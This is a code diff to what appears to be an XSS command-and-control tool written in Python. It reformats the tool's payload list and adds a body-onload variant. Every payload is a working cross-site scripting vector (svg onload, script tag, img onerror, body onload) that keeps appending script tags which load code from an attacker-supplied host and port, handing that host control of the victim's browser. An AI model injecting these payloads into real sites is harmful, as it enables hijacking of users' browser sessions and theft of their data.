@@ -59,10 +59,11 @@ gene = args.gene
 cmd = format(args.command)
 secs = int(format(args.secs))
 payload = '''
- - SVG: <svg/onload=setInterval(function(){with(document)body.appendChild(createElement("script")).src="//%s:%s"},1010)>
- - SCRIPT: <script>setInterval(function(){with(document)body.appendChild(createElement("script")).src="//%s:%s"},1010)</script>
- - IMG: <img src=x onerror=setInterval(function(){with(document)body.appendChild(createElement("script")).src="//%s:%s"},1010)>
-''' % (host, port, host, port, host, port)
+ - SVG: <svg/onload=setInterval(function(){with(document)body.appendChild(createElement("script")).src="//{0}:{1}"},1010)>
+ - SCRIPT: <script>setInterval(function(){with(document)body.appendChild(createElement("script")).src="//{0}:{1}"},1010)</script>
+ - IMG: <img src=x onerror=setInterval(function(){with(document)body.appendChild(createElement("script")).src="//{0}:{1}"},1010)>
+ - BODY: <body onload=setInterval(function(){with(document)body.appendChild(createElement("script")).src="//{0}:{1}"}></body>
+'''.format(host, port)
 
         
 form = b'''HTTP/1.1 200 OK
